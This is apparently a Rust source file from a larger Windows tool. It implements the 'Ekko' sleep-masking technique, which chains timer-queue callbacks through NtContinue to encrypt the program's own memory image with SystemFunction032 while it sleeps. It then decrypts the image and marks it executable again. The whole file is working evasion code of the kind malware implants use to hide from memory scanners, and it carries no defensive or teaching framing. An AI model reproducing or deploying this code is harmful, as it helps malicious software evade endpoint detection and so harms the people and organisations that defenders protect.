use crate::recovery::helpers::pe::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};
use std::ffi::c_void;
use tracing::debug;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::Debug::{CONTEXT, RtlCaptureContext};
use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
use windows::Win32::System::Memory::{PAGE_PROTECTION_FLAGS, PAGE_READWRITE};
use windows::Win32::System::Threading::{
    CreateEventW, CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueue,
    WT_EXECUTEINTIMERTHREAD, WaitForSingleObject,
};
use windows::core::{PCSTR, PCWSTR};

#[repr(C)]
struct Ustring {
    length: u32,
    maximum_length: u32,
    buffer: *mut c_void,
}

pub fn stealth_sleep(millis: u32) {
    if millis == 0 {
        return;
    }

    unsafe {
        let h_ntdll = GetModuleHandleW(PCWSTR(
            "ntdll.dll\0".encode_utf16().collect::<Vec<_>>().as_ptr(),
        ))
        .unwrap_or_default();
        let h_advapi32 = GetModuleHandleW(PCWSTR(
            "advapi32.dll\0".encode_utf16().collect::<Vec<_>>().as_ptr(),
        ))
        .unwrap_or_default();
        let h_kernel32 = GetModuleHandleW(PCWSTR(
            "kernel32.dll\0".encode_utf16().collect::<Vec<_>>().as_ptr(),
        ))
        .unwrap_or_default();

        let p_nt_continue = GetProcAddress(h_ntdll, PCSTR("NtContinue\0".as_ptr()));
        let p_system_function_032 =
            GetProcAddress(h_advapi32, PCSTR("SystemFunction032\0".as_ptr()));
        let p_virtual_protect = GetProcAddress(h_kernel32, PCSTR("VirtualProtect\0".as_ptr()));
        let p_set_event = GetProcAddress(h_kernel32, PCSTR("SetEvent\0".as_ptr()));

        if p_nt_continue.is_none()
            || p_system_function_032.is_none()
            || p_virtual_protect.is_none()
            || p_set_event.is_none()
        {
            debug!("Required symbols for Ekko sleep not found, falling back to normal sleep");
            std::thread::sleep(std::time::Duration::from_millis(millis as u64));
            return;
        }

        let base = GetModuleHandleW(None).unwrap_or_default().0 as *mut c_void;
        let dos_header = &*(base as *const IMAGE_DOS_HEADER);
        let nt_headers = &*(base.add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
        let image_size = nt_headers.optional_header.size_of_image as usize;

        let mut key_data = [0u8; 16];
        for i in 0..16 {
            key_data[i] = (i * 0x33) as u8;
        }
        let mut key = Ustring {
            length: 16,
            maximum_length: 16,
            buffer: key_data.as_mut_ptr() as *mut c_void,
        };
        let mut data = Ustring {
            length: image_size as u32,
            maximum_length: image_size as u32,
            buffer: base,
        };

        let event = CreateEventW(None, true, false, None).unwrap_or(HANDLE(0));
        let timer_queue = CreateTimerQueue().unwrap_or(HANDLE(0));

        let mut old_protect = PAGE_PROTECTION_FLAGS::default();

        let mut ctx_template = CONTEXT::default();
        RtlCaptureContext(&mut ctx_template);

        let mut ctx_prot_rw = ctx_template.clone();
        ctx_prot_rw.Rip = p_virtual_protect.unwrap() as u64;
        ctx_prot_rw.Rcx = base as u64;
        ctx_prot_rw.Rdx = image_size as u64;
        ctx_prot_rw.R8 = PAGE_READWRITE.0 as u64;
        ctx_prot_rw.R9 = &mut old_protect as *mut _ as u64;

        let mut ctx_mask = ctx_template.clone();
        ctx_mask.Rip = p_system_function_032.unwrap() as u64;
        ctx_mask.Rcx = &mut data as *mut _ as u64;
        ctx_mask.Rdx = &mut key as *mut _ as u64;

        let mut ctx_unmask = ctx_template.clone();
        ctx_unmask.Rip = p_system_function_032.unwrap() as u64;
        ctx_unmask.Rcx = &mut data as *mut _ as u64;
        ctx_unmask.Rdx = &mut key as *mut _ as u64;

        let mut ctx_prot_rx = ctx_template.clone();
        ctx_prot_rx.Rip = p_virtual_protect.unwrap() as u64;
        ctx_prot_rx.Rcx = base as u64;
        ctx_prot_rx.Rdx = image_size as u64;
        ctx_prot_rx.R8 = 0x40; // PAGE_EXECUTE_READWRITE
        ctx_prot_rx.R9 = &mut old_protect as *mut _ as u64;

        let mut ctx_set_event = ctx_template.clone();
        ctx_set_event.Rip = p_set_event.unwrap() as u64;
        ctx_set_event.Rcx = event.0 as u64;

        debug!("queueing Ekko sleep mask chain ({}ms)", millis);

        let mut h_timer = HANDLE(0);

        let _ = CreateTimerQueueTimer(
            &mut h_timer,
            timer_queue,
            Some(std::mem::transmute(p_nt_continue)),
            Some(&ctx_prot_rw as *const _ as *const c_void),
            10,
            0,
            WT_EXECUTEINTIMERTHREAD,
        );
        let _ = CreateTimerQueueTimer(
            &mut h_timer,
            timer_queue,
            Some(std::mem::transmute(p_nt_continue)),
            Some(&ctx_mask as *const _ as *const c_void),
            20,
            0,
            WT_EXECUTEINTIMERTHREAD,
        );

        let _ = CreateTimerQueueTimer(
            &mut h_timer,
            timer_queue,
            Some(std::mem::transmute(p_nt_continue)),
            Some(&ctx_unmask as *const _ as *const c_void),
            millis + 30,
            0,
            WT_EXECUTEINTIMERTHREAD,
        );
        let _ = CreateTimerQueueTimer(
            &mut h_timer,
            timer_queue,
            Some(std::mem::transmute(p_nt_continue)),
            Some(&ctx_prot_rx as *const _ as *const c_void),
            millis + 40,
            0,
            WT_EXECUTEINTIMERTHREAD,
        );
        let _ = CreateTimerQueueTimer(
            &mut h_timer,
            timer_queue,
            Some(std::mem::transmute(p_nt_continue)),
            Some(&ctx_set_event as *const _ as *const c_void),
            millis + 50,
            0,
            WT_EXECUTEINTIMERTHREAD,
        );

        let _ = WaitForSingleObject(event, 0xFFFFFFFF);

        let _ = DeleteTimerQueue(timer_queue);
        let _ = CloseHandle(event);

        debug!("Ekko sleep masking cycle complete");
    }
}
